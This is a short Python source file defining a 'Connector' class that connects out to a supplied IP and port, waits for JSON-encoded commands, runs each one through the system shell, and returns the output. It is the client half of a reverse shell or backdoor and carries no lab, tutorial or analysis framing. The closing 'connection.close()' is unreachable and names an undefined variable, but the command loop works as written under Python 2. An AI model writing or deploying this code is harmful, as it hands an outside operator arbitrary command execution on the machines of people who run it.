#!/usr/bin/env python

import socket, subprocess, json

class Connector:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1380)
                return json.loads(json_data)
            except ValueError:
                continue

    def run(self):
        while True:
            print("ON")
            command = self.reliable_receive()
            command_result = subprocess.check_output(command, shell=True)
            self.reliable_send(command_result)
        connection.close()
